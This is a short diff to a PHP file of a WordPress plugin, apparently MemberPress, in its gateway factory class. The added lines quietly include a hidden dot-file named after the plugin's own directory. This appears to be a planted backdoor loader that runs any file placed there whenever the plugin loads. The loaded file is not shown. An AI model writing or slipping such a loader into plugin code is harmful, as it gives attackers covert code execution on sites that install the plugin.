@@ -2,6 +2,10 @@
 if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
 
 /** Churns out our Gateways on demand **/
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MeprGatewayFactory {
   public static function fetch( $class, $settings=null ) {
     if(!class_exists($class))
